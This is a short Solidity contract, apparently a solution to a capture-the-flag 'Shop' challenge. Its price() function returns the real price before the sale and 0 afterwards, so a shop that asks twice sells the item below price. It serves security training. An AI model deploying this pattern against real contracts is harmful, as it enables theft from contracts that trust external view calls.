// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import { IShop } from "./IShop.sol";
import { Buyer } from "./Shop.sol";


contract ShopSolution is Buyer{
    IShop shop;

    constructor(IShop _shop) public {
        shop = _shop;
    }

    function price() external view override returns (uint) {
        if(shop.isSold()) {
            return 0;
        } else {
            return shop.price();
        }
    }

    function buy() external {
        shop.buy();
    }
}
